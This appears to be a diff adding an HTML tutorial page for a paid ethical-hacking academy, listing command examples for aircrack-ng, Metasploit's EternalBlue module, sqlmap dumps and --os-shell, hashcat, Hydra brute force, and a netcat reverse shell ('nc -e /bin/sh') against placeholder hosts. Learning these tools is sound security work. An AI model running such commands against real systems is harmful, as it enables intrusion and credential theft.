@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, viewport-fit=cover">
+    <title>Learn Ethical Hacking — NEXO-TECHNOLOGIES Academy</title>
+    <meta name="description" content="Master Cybersecurity & Ethical Hacking skills with NEXO-TECHNOLOGIES. Tutorials, CLI command guides, Metasploit, Nmap, Wireshark, Fernet cryptography and training packages.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@300;400;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --nexo-black:#020812;--nexo-dark:#050d1a;--nexo-darker:#0a1628;
+            --neon-cyan:#00f5ff;--neon-magenta:#ff006e;--neon-green:#00ff88;
+            --neon-gold:#ffd700;--neon-purple:#bf00ff;--neon-orange:#ff6b00;
+            --neon-pink:#ff006e;--neon-red:#ff1744;
+            --text-primary:#e8f4fd;--text-secondary:#8baac9;--text-muted:#4a6680;
+            --glow-cyan:0 0 20px rgba(0,245,255,.6),0 0 40px rgba(0,245,255,.3);
+            --glow-purple:0 0 20px rgba(191,0,255,.6),0 0 40px rgba(191,0,255,.3);
+            --border-card:1px solid rgba(0,245,255,.12);
+            --transition:all .35s cubic-bezier(.4,0,.2,1);
+            --border-radius:16px;
+        }
+        *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+        html{scroll-behavior:smooth}
+        body{background:var(--nexo-black);color:var(--text-primary);font-family:'Inter',sans-serif;overflow-x:hidden;cursor:none}
+        ::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:var(--nexo-dark)}::-webkit-scrollbar-thumb{background:var(--neon-cyan);border-radius:2px}
+        #custom-cursor{position:fixed;width:10px;height:10px;background:var(--neon-cyan);border-radius:50%;pointer-events:none;z-index:99999;transform:translate(-50%,-50%);box-shadow:var(--glow-cyan)}
+        #cursor-trail{position:fixed;width:32px;height:32px;border:1.5px solid rgba(0,245,255,.5);border-radius:50%;pointer-events:none;z-index:99998;transform:translate(-50%,-50%)}
+        #matrix-bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;opacity:.1;pointer-events:none}
+        .container{max-width:1280px;margin:0 auto;padding:0 2rem}
+
+        /* NAVBAR */
+        .navbar{position:fixed;top:0;left:0;right:0;z-index:1000;padding:.9rem 0;background:rgba(2,8,18,.85);backdrop-filter:blur(20px);border-bottom:1px solid rgba(0,245,255,.1)}
+        .navbar .container{display:flex;align-items:center;justify-content:space-between}
+        .logo{font-family:'Space Grotesk',sans-serif;font-size:1.2rem;font-weight:700;letter-spacing:.1em;cursor:pointer;display:flex;align-items:center;gap:.5rem;color:var(--neon-cyan);text-shadow:var(--glow-cyan);text-decoration:none}
+        .logo-hex{width:28px;height:28px;background:var(--neon-cyan);clip-path:polygon(50% 0%,100% 25%,100% 75%,50% 100%,0% 75%,0% 25%);animation:hex-rotate 6s linear infinite}
+        @keyframes hex-rotate{0%,100%{transform:rotate(0)}50%{transform:rotate(180deg)}}
+        .nav-menu{display:flex;align-items:center;gap:.25rem;list-style:none}
+        .nav-link{font-family:'Space Grotesk',sans-serif;font-size:.82rem;font-weight:500;letter-spacing:.06em;color:var(--text-secondary);text-decoration:none;padding:.5rem .8rem;border-radius:8px;transition:var(--transition);text-transform:uppercase}
+        .nav-link:hover{color:var(--neon-cyan)}
+        .nav-actions{display:flex;gap:.6rem}
+        .theme-toggle,.mobile-menu-toggle{background:rgba(0,245,255,.06);border:1px solid rgba(0,245,255,.15);color:var(--text-secondary);width:38px;height:38px;border-radius:10px;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:var(--transition)}
+        .theme-toggle:hover,.mobile-menu-toggle:hover{color:var(--neon-cyan);border-color:var(--neon-cyan)}
+        .mobile-menu-toggle{display:none}
+        @media(max-width:900px){.nav-menu{display:none;position:fixed;inset:0;background:rgba(2,8,18,.98);backdrop-filter:blur(30px);flex-direction:column;justify-content:center;gap:1.5rem;z-index:999}.nav-menu.active{display:flex}.nav-link{font-size:1.2rem;padding:1rem 2rem}.mobile-menu-toggle{display:flex}}
+
+        /* HERO */
+        .learn-hero{position:relative;min-height:50vh;display:flex;align-items:center;justify-content:center;text-align:center;overflow:hidden;margin-top:60px;background:radial-gradient(ellipse at top,rgba(0,245,255,.15) 0%,transparent 60%),radial-gradient(ellipse at bottom,rgba(191,0,255,.1) 0%,transparent 60%),var(--nexo-dark)}
+        .learn-hero::before{content:'';position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,245,255,.03) 2px,rgba(0,245,255,.03) 4px);animation:scanL 10s linear infinite;pointer-events:none}
+        @keyframes scanL{0%{background-position:0 0}100%{background-position:0 100vh}}
+        .learn-hero-content{position:relative;z-index:2;padding:3rem 2rem}
+        .back-link{display:inline-flex;align-items:center;gap:.5rem;font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--text-muted);text-decoration:none;letter-spacing:.1em;margin-bottom:2rem;padding:.4rem .9rem;border:1px solid rgba(255,255,255,.08);border-radius:999px;transition:var(--transition)}
+        .back-link:hover{color:var(--neon-cyan);border-color:rgba(0,245,255,.3)}
+        .learn-hero h1{font-family:'Space Grotesk',sans-serif;font-size:clamp(2.2rem,6vw,4.5rem);font-weight:700;color:var(--text-primary);margin-bottom:.5rem}
+        .learn-hero h1 span{color:var(--neon-cyan);text-shadow:var(--glow-cyan)}
+        .learn-hero .subtitle{font-family:'JetBrains Mono',monospace;font-size:.85rem;color:var(--text-muted);letter-spacing:.2em}
+
+        /* SECTION SHARED */
+        section.content-section{padding:4rem 0}
+        .disclaimer{background:rgba(255,215,0,.05);border:1px solid rgba(255,215,0,.2);border-radius:12px;padding:1.2rem 1.5rem;margin-bottom:3rem;font-size:.85rem;color:#e8d44d;display:flex;align-items:center;gap:1rem}
+        .disclaimer i{font-size:1.3rem;flex-shrink:0}
+
+        /* TOPIC SECTIONS */
+        .topic-grid{display:grid;grid-template-columns:1fr;gap:2rem}
+        .topic-section{background:rgba(5,13,26,.85);border:var(--border-card);border-left:4px solid var(--neon-cyan);border-radius:16px;padding:2rem;backdrop-filter:blur(10px);transition:var(--transition);position:relative;overflow:hidden}
+        .topic-section:hover{border-color:rgba(0,245,255,.4);transform:translateY(-4px);box-shadow:0 20px 40px rgba(0,0,0,.4),var(--glow-cyan)}
+        .topic-section h3{font-family:'Space Grotesk',sans-serif;font-size:1.25rem;font-weight:700;color:var(--text-primary);margin-bottom:1rem;display:flex;align-items:center;gap:.8rem}
+        .topic-section h3 i{font-size:1.4rem}
+        .topic-content{display:grid;grid-template-columns:1.2fr 1fr;gap:2rem;align-items:start}
+        @media(max-width:900px){.topic-content{grid-template-columns:1fr}}
+        .topic-text p{color:var(--text-secondary);font-size:.88rem;line-height:1.8;margin-bottom:.8rem}
+        .topic-commands{background:rgba(2,8,18,.95);border:1px solid rgba(0,245,255,.1);border-radius:12px;padding:1.2rem}
+        .topic-commands h4{font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--neon-cyan);letter-spacing:.1em;margin-bottom:.8rem;text-transform:uppercase}
+        .topic-commands code{display:block;background:rgba(0,245,255,.04);border:1px solid rgba(0,245,255,.08);border-radius:6px;padding:.5rem .8rem;margin-bottom:.5rem;font-family:'JetBrains Mono',monospace;font-size:.78rem;color:#a8e6ff;overflow-x:auto}
+        .topic-commands code:last-child{margin-bottom:0}
+
+        /* APPLY / CTA SECTION */
+        .apply-section{background:linear-gradient(135deg,rgba(0,245,255,.15),rgba(191,0,255,.15));border:1px solid rgba(0,245,255,.3);border-radius:24px;padding:3rem 2rem;margin:4rem 0;text-align:center;position:relative;overflow:hidden;backdrop-filter:blur(10px)}
+        .apply-section h3{font-family:'Space Grotesk',sans-serif;font-size:2rem;font-weight:700;color:var(--text-primary);margin-bottom:1rem}
+        .apply-section p{color:var(--text-secondary);max-width:600px;margin:0 auto 2rem;font-size:.95rem;line-height:1.7}
+        .apply-btn{display:inline-flex;align-items:center;gap:.6rem;background:linear-gradient(135deg,var(--neon-cyan),rgba(0,245,255,.7));color:#020812;font-family:'Space Grotesk',sans-serif;font-weight:700;font-size:1rem;padding:.9rem 2.2rem;border-radius:12px;text-decoration:none;transition:var(--transition);box-shadow:var(--glow-cyan)}
+        .apply-btn:hover{transform:scale(1.05);box-shadow:0 0 40px rgba(0,245,255,.8)}
+
+        /* ACADEMY PACKAGES */
+        .package-section{padding:4rem 0}
+        .package-header{text-align:center;margin-bottom:3rem}
+        .package-header h2{font-family:'Space Grotesk',sans-serif;font-size:2.2rem;font-weight:700;color:var(--text-primary)}
+        .package-header h2 span{color:var(--neon-purple);text-shadow:var(--glow-purple)}
+        .package-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:2rem}
+        .package-card{background:rgba(5,13,26,.85);border:var(--border-card);border-radius:20px;padding:2rem;transition:var(--transition);position:relative;display:flex;flex-direction:column;justify-content:space-between}
+        .package-card:hover{border-color:rgba(191,0,255,.4);transform:translateY(-8px);box-shadow:0 25px 50px rgba(0,0,0,.5),var(--glow-purple)}
+        .package-title{font-family:'Space Grotesk',sans-serif;font-size:1.3rem;font-weight:700;color:var(--text-primary);display:flex;align-items:center;gap:.8rem;margin-bottom:1rem}
+        .package-title i{color:var(--neon-purple);font-size:1.5rem}
+        .package-price{font-family:'Space Grotesk',sans-serif;font-size:2.2rem;font-weight:700;color:var(--neon-purple);margin-bottom:.3rem;text-shadow:var(--glow-purple)}
+        .package-subtitle{font-family:'JetBrains Mono',monospace;font-size:.75rem;color:var(--text-muted);margin-bottom:1.5rem}
+        .package-features{list-style:none;margin-bottom:2rem}
+        .package-features li{display:flex;align-items:center;gap:.6rem;color:var(--text-secondary);font-size:.87rem;padding:.5rem 0;border-bottom:1px solid rgba(255,255,255,.04)}
+        .package-features li i{color:var(--neon-green);font-size:.8rem}
+        .package-cta{display:block;text-align:center;padding:.8rem;border-radius:10px;font-family:'Space Grotesk',sans-serif;font-weight:600;font-size:.9rem;background:rgba(191,0,255,.1);border:1px solid rgba(191,0,255,.3);color:var(--neon-purple);text-decoration:none;transition:var(--transition)}
+        .package-cta:hover{background:var(--neon-purple);color:#fff;box-shadow:var(--glow-purple)}
+
+        /* FOOTER */
+        .footer{background:var(--nexo-black);border-top:1px solid rgba(0,245,255,.08);padding:2rem 0}
+        .footer .container{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:1rem}
+        .footer-left p{font-size:.8rem;color:var(--text-muted);font-family:'JetBrains Mono',monospace}
+        .footer-left span{color:var(--neon-cyan)}
+        .visitor-counter{font-family:'JetBrains Mono',monospace;font-size:.7rem;color:var(--text-muted);margin-top:.3rem;display:flex;align-items:center;gap:.4rem}
+        .social-links{display:flex;align-items:center;gap:.8rem}
+        .social-link{width:38px;height:38px;border-radius:10px;background:rgba(0,245,255,.05);border:1px solid rgba(0,245,255,.1);color:var(--text-muted);display:flex;align-items:center;justify-content:center;text-decoration:none;transition:var(--transition)}
+        .social-link:hover{color:var(--neon-cyan);border-color:var(--neon-cyan);box-shadow:var(--glow-cyan)}
+        .nexo-tech-link{font-family:'JetBrains Mono',monospace;font-size:.72rem;letter-spacing:.1em;color:var(--neon-cyan);text-decoration:none;background:rgba(0,245,255,.06);border:1px solid rgba(0,245,255,.2);border-radius:8px;padding:.4rem .8rem;transition:var(--transition)}
+        .nexo-tech-link:hover{background:rgba(0,245,255,.15)}
+
+        .reveal{opacity:0;transform:translateY(40px);transition:opacity .8s ease,transform .8s ease}
+        .reveal.visible{opacity:1;transform:none}
+
+        /* LIGHT THEME */
+        :root[data-theme='light']{--nexo-black:#f0f4f8;--nexo-dark:#e2e8f0;--nexo-darker:#d1d9e3;--text-primary:#0f172a;--text-secondary:#475569;--text-muted:#94a3b8;--border-card:1px solid rgba(0,100,200,.12)}
+    </style>
+</head>
+<body>
+    <div id="custom-cursor"></div>
+    <div id="cursor-trail"></div>
+    <canvas id="matrix-bg"></canvas>
+
+    <!-- NAVBAR -->
+    <nav class="navbar" id="navbar">
+        <div class="container">
+            <a href="index.html" class="logo"><div class="logo-hex"></div>NEXO-TECHNOLOGIES</a>
+            <ul class="nav-menu" id="nav-menu">
+                <li><a href="index.html" class="nav-link">Home</a></li>
+                <li><a href="index.html#skills" class="nav-link">Skills</a></li>
+                <li><a href="programming.html" class="nav-link">Programming</a></li>
+                <li><a href="hacking.html" class="nav-link">Hacking</a></li>
+                <li><a href="tools.html" class="nav-link">Arsenal</a></li>
+                <li><a href="terminal.html" class="nav-link">Terminal</a></li>
+                <li><a href="lab.html" class="nav-link">Lab</a></li>
+                <li><a href="learn-hacking.html" class="nav-link active">Learn</a></li>
+                <li><a href="index.html#ai-chat" class="nav-link">AI</a></li>
+                <li><a href="index.html#contact" class="nav-link">Contact</a></li>
+            </ul>
+            <div class="nav-actions">
+                <button class="theme-toggle" id="themeToggle" title="Toggle theme"><i class="fas fa-moon"></i></button>
+                <button class="mobile-menu-toggle" id="mobileMenuToggle" aria-label="Toggle menu" aria-expanded="false"><i class="fas fa-bars"></i></button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- HERO -->
+    <section class="learn-hero">
+        <div class="learn-hero-content">
+            <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Back to NEXO-TECH HQ</a>
+            <h1>Learn <span>Ethical Hacking</span></h1>
+            <div class="subtitle">// NEXO ACADEMY // MASTER CYBERSECURITY SKILLS</div>
+        </div>
+    </section>
+
+    <!-- CONTENT -->
+    <section class="content-section">
+        <div class="container">
+
+            <!-- DISCLAIMER -->
+            <div class="disclaimer reveal">
+                <i class="fas fa-exclamation-triangle"></i>
+                <span><strong>Legal & Ethical Disclaimer:</strong> All cybersecurity concepts, command-line examples, and tutorials provided by NEXO-TECHNOLOGIES are strictly for <strong>educational purposes and authorized security auditing only</strong>. Testing unauthorized targets is illegal.</span>
+            </div>
+
+            <!-- TOPICS GRID -->
+            <div class="topic-grid">
+
+                <!-- 1. WIFI HACKING -->
+                <div class="topic-section reveal">
+                    <h3><i class="fas fa-wifi" style="color:var(--neon-cyan)"></i> WiFi Hacking & Wireless Security</h3>
+                    <div class="topic-content">
+                        <div class="topic-text">
+                            <p>Learn wireless network security protocols including WPA/WPA2/WPA3 handshake capture, deauthentication attacks, PMKID cracking, and rogue access point deployment. Understand how wireless data packets are transmitted and secured.</p>
+                            <p>Key concepts: Monitor mode, packet injection, handshake cracking using dictionary attacks, and wireless intrusion detection.</p>
+                        </div>
+                        <div class="topic-commands">
+                            <h4>// ESSENTIAL COMMANDS</h4>
+                            <code>iwconfig</code>
+                            <code>airmon-ng start wlan0</code>
+                            <code>airodump-ng mon0</code>
+                            <code>airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w cap mon0</code>
+                            <code>aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX mon0</code>
+                            <code>aircrack-ng -w wordlist.txt cap-01.cap</code>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 2. METASPLOIT -->
+                <div class="topic-section reveal">
+                    <h3><i class="fas fa-bug" style="color:var(--neon-red)"></i> Metasploit Framework Exploitation</h3>
+                    <div class="topic-content">
+                        <div class="topic-text">
+                            <p>Master the industry-standard penetration testing framework. Learn module selection, payload generation with msfvenom, exploit execution, and Meterpreter post-exploitation techniques.</p>
+                            <p>Covers: Auxiliary scanners, remote code execution (RCE) exploits, stagers, privilege escalation, and lateral movement.</p>
+                        </div>
+                        <div class="topic-commands">
+                            <h4>// ESSENTIAL COMMANDS</h4>
+                            <code>msfconsole</code>
+                            <code>search eternalblue</code>
+                            <code>use exploit/windows/smb/ms17_010_eternalblue</code>
+                            <code>show options</code>
+                            <code>set RHOSTS 192.168.1.100</code>
+                            <code>exploit</code>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 3. WIRESHARK -->
+                <div class="topic-section reveal">
+                    <h3><i class="fas fa-network-wired" style="color:var(--neon-purple)"></i> Wireshark & Network Forensics</h3>
+                    <div class="topic-content">
+                        <div class="topic-text">
+                            <p>Become proficient in packet capture and traffic analysis. Filter HTTP streams, extract credentials sent over plaintext, dissect DNS queries, and detect anomalous network behavior.</p>
+                            <p>Topics: Display filters, follow TCP stream, PCAP export, and CLI traffic capture with tshark and tcpdump.</p>
+                        </div>
+                        <div class="topic-commands">
+                            <h4>// ESSENTIAL COMMANDS</h4>
+                            <code>wireshark</code>
+                            <code>tshark -i eth0 -w capture.pcap</code>
+                            <code>tshark -r capture.pcap -Y "http.request"</code>
+                            <code>tcpdump -i eth0 -w capture.pcap</code>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 4. FEROXBUSTER -->
+                <div class="topic-section reveal">
+                    <h3><i class="fas fa-search" style="color:var(--neon-gold)"></i> Feroxbuster (Directory Brute-Forcing)</h3>
+                    <p class="topic-text">High-speed, recursive directory and file discovery written in Rust. Locate hidden endpoints, backup files, and unlinked admin portals on web servers efficiently.</p>
+                    <div class="topic-content">
+                        <div class="topic-text">
+                            <p>Covers: Custom wordlists, status code filtering, thread tuning, recursive depth scanning, and extension probing.</p>
+                        </div>
+                        <div class="topic-commands">
+                            <h4>// ESSENTIAL COMMANDS</h4>
+                            <code>feroxbuster -u http://target.com -w wordlist.txt</code>
+                            <code>feroxbuster -u http://target.com -w list.txt -x php,txt,json</code>
+                            <code>feroxbuster -u http://target.com -w list.txt --recursive</code>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 5. FERNET -->
+                <div class="topic-section reveal">
+                    <h3><i class="fas fa-lock" style="color:var(--neon-green)"></i> Cryptography & Fernet Symmetric Encryption</h3>
+                    <div class="topic-content">
+                        <div class="topic-text">
+                            <p>Master AES-128 encryption in CBC mode with HMAC-SHA256 signature verification using Python's Fernet library. Secure data at rest and build confidential communication channels.</p>
+                            <p>Topics: Key generation, key management, token encryption, and cryptographic payload building.</p>
+                        </div>
+                        <div class="topic-commands">
+                            <h4>// PYTHON EXAMPLES</h4>
+                            <code>from cryptography.fernet import Fernet</code>
+                            <code>key = Fernet.generate_key()</code>
+                            <code>cipher = Fernet(key)</code>
+                            <code>token = cipher.encrypt(b"NEXO-TECH SECRET")</code>
+                            <code>decrypted = cipher.decrypt(token)</code>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 6. NMAP -->
+                <div class="topic-section reveal">
+                    <h3><i class="fas fa-radar" style="color:var(--neon-cyan)"></i> Nmap Network Scanner</h3>
+                    <div class="topic-content">
+                        <div class="topic-text">
+                            <p>The definitive host discovery and vulnerability scanner. Perform stealth SYN scans, OS detection, service version auditing, and execute custom Lua scripts via Nmap Scripting Engine (NSE).</p>
+                            <p>Features: Firewall evasion, timing templates (-T0 to -T5), UDP scanning, and vuln script auditing.</p>
+                        </div>
+                        <div class="topic-commands">
+                            <h4>// ESSENTIAL COMMANDS</h4>
+                            <code>nmap -sn 192.168.1.0/24</code>
+                            <code>nmap -sV -O 192.168.1.100</code>
+                            <code>nmap -p 1-65535 --open 192.168.1.100</code>
+                            <code>nmap --script vuln 192.168.1.100</code>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 7. SQLMAP -->
+                <div class="topic-section reveal">
+                    <h3><i class="fas fa-database" style="color:var(--neon-red)"></i> SQLMap Automated Injection</h3>
+                    <div class="topic-content">
+                        <div class="topic-text">
+                            <p>Automate SQL injection detection and database takeover. Extract schema structures, dump database tables, read remote server files, and spawn interactive OS shell prompts.</p>
+                            <p>Techniques: Blind boolean, time-based delay, UNION query, error-based, and stacked queries.</p>
+                        </div>
+                        <div class="topic-commands">
+                            <h4>// ESSENTIAL COMMANDS</h4>
+                            <code>sqlmap -u "http://target.com?id=1" --dbs</code>
+                            <code>sqlmap -u "http://target.com?id=1" -D db_name --tables</code>
+                            <code>sqlmap -u "http://target.com?id=1" -D db -T users --dump</code>
+                            <code>sqlmap -u "http://target.com?id=1" --os-shell</code>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 8. HASHCAT -->
+                <div class="topic-section reveal">
+                    <h3><i class="fas fa-key" style="color:var(--neon-purple)"></i> Hashcat GPU Password Cracking</h3>
+                    <div class="topic-content">
+                        <div class="topic-text">
+                            <p>The world's fastest GPU-accelerated password recovery utility. Perform dictionary, combinator, mask, and hybrid attacks against hundreds of hash algorithm formats.</p>
+                            <p>Supported: MD5, SHA256, NTLM, WPA/WPA2 handshakes, bcrypt, Argon2, and PDF/ZIP passwords.</p>
+                        </div>
+                        <div class="topic-commands">
+                            <h4>// ESSENTIAL COMMANDS</h4>
+                            <code>hashcat -m 0 -a 0 hashes.txt wordlist.txt</code>
+                            <code>hashcat -m 1000 -a 3 ntlm.txt ?a?a?a?a?a?a</code>
+                            <code>hashcat -m 2500 -a 0 wpa.hccapx wordlist.txt</code>
+                            <code>hashcat --show hashes.txt</code>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 9. HYDRA -->
+                <div class="topic-section reveal">
+                    <h3><i class="fas fa-unlock-alt" style="color:var(--neon-orange)"></i> Hydra Network Login Cracker</h3>
+                    <div class="topic-content">
+                        <div class="topic-text">
+                            <p>Parallelized network login cracker supporting numerous protocols. Audit weak passwords across SSH, FTP, HTTP forms, RDP, SMB, and database instances.</p>
+                            <p>Features: Multi-threaded connection pools, custom form parsing, proxy routing, and wordlist pairing.</p>
+                        </div>
+                        <div class="topic-commands">
+                            <h4>// ESSENTIAL COMMANDS</h4>
+                            <code>hydra -l admin -P pass.txt ssh://192.168.1.100</code>
+                            <code>hydra -L users.txt -P pass.txt ftp://192.168.1.100</code>
+                            <code>hydra -l admin -P pass.txt http-post-form "/login:user=^USER^&pass=^PASS^:Failed"</code>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 10. NETCAT -->
+                <div class="topic-section reveal">
+                    <h3><i class="fas fa-terminal" style="color:var(--neon-gold)"></i> Netcat (nc) — The Swiss Army Knife</h3>
+                    <div class="topic-content">
+                        <div class="topic-text">
+                            <p>Versatile networking utility used for reading and writing network connections via TCP/UDP. Used for banner grabbing, port listening, raw socket testing, file transfer, and reverse shell handlers.</p>
+                            <p>Capabilities: Listeners, port scanning, raw HTTP requests, and socket relays.</p>
+                        </div>
+                        <div class="topic-commands">
+                            <h4>// ESSENTIAL COMMANDS</h4>
+                            <code>nc -zv 192.168.1.100 1-1000</code>
+                            <code>nc -lvnp 4444</code>
+                            <code>nc 192.168.1.100 4444</code>
+                            <code>nc -e /bin/sh 192.168.1.100 4444</code>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- APPLY / CTA SECTION -->
+            <div class="apply-section reveal">
+                <h3>Ready to Accelerate Your Cybersecurity Career?</h3>
+                <p>Join the NEXO-TECHNOLOGIES Academy mentorship program. Get hands-on training, private lab access, custom pentesting tools, and 1-on-1 guidance from active security specialists.</p>
+                <a href="https://wa.me/2347044339491" target="_blank" class="apply-btn"><i class="fab fa-whatsapp"></i> Apply for Mentorship</a>
+            </div>
+
+            <!-- ACADEMY TRAINING PACKAGES -->
+            <div class="package-section">
+                <div class="package-header reveal">
+                    <h2>Training <span>Packages</span></h2>
+                    <p style="color:var(--text-muted);font-family:'JetBrains Mono',monospace;font-size:.85rem;margin-top:.5rem">Structured learning paths designed for all skill levels</p>
+                </div>
+                <div class="package-grid">
+
+                    <div class="package-card reveal">
+                        <div>
+                            <div class="package-title"><i class="fas fa-seedling"></i> Beginner Foundations</div>
+                            <div class="package-price">$150</div>
+                            <div class="package-subtitle">4 Weeks Intensive</div>
+                            <ul class="package-features">
+                                <li><i class="fas fa-check"></i> Linux Fundamentals & Bash</li>
+                                <li><i class="fas fa-check"></i> Networking & TCP/IP Deep Dive</li>
+                                <li><i class="fas fa-check"></i> Basic Nmap & Reconnaissance</li>
+                                <li><i class="fas fa-check"></i> Introduction to Python Scripting</li>
+                                <li><i class="fas fa-check"></i> Weekly Q&A Sessions</li>
+                            </ul>
+                        </div>
+                        <a href="https://wa.me/2347044339491" target="_blank" class="package-cta">Enroll Now</a>
+                    </div>
+
+                    <div class="package-card reveal">
+                        <div>
+                            <div class="package-title"><i class="fas fa-user-ninja"></i> Pentester Professional</div>
+                            <div class="package-price">$350</div>
+                            <div class="package-subtitle">8 Weeks Mastery</div>
+                            <ul class="package-features">
+                                <li><i class="fas fa-check"></i> Web App Pentesting (OWASP Top 10)</li>
+                                <li><i class="fas fa-check"></i> Metasploit & Exploit Frameworks</li>
+                                <li><i class="fas fa-check"></i> Wireless Auditing (WPA2/WPA3)</li>
+                                <li><i class="fas fa-check"></i> Custom Tool Building in Rust & Python</li>
+                                <li><i class="fas fa-check"></i> Virtual Vulnerable Lab Access</li>
+                                <li><i class="fas fa-check"></i> Certificate of Completion</li>
+                            </ul>
+                        </div>
+                        <a href="https://wa.me/2347044339491" target="_blank" class="package-cta">Enroll Now</a>
+                    </div>
+
+                    <div class="package-card reveal">
+                        <div>
+                            <div class="package-title"><i class="fas fa-crown"></i> Red Team Specialist</div>
+                            <div class="package-price">$700</div>
+                            <div class="package-subtitle">12 Weeks Advanced</div>
+                            <ul class="package-features">
+                                <li><i class="fas fa-check"></i> Active Directory Exploitation</li>
+                                <li><i class="fas fa-check"></i> AV/EDR Evasion & Obfuscation</li>
+                                <li><i class="fas fa-check"></i> Kernel Privilege Escalation</li>
+                                <li><i class="fas fa-check"></i> Custom C2 Infrastructure Setup</li>
+                                <li><i class="fas fa-check"></i> 1-on-1 Direct Mentorship</li>
+                                <li><i class="fas fa-check"></i> Lifetime NEXO Tools Access</li>
+                            </ul>
+                        </div>
+                        <a href="https://wa.me/2347044339491" target="_blank" class="package-cta">Enroll Now</a>
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-left">
+                <p>© 2026 <span>NEXO-TECHNOLOGIES</span> — Academy & Educational Division</p>
+                <div class="visitor-counter"><i class="fas fa-eye"></i> <span id="visitor-count">0</span> visitors</div>
+            </div>
+            <div class="social-links">
+                <a href="https://github.com/demonalexander526-alt" target="_blank" class="social-link"><i class="fab fa-github"></i></a>
+                <a href="#" class="social-link"><i class="fab fa-linkedin"></i></a>
+                <a href="#" class="social-link"><i class="fab fa-twitter"></i></a>
+                <a href="https://t.me/gamedevelopersappdevelopers" target="_blank" class="nexo-tech-link">NEXO-TECH</a>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
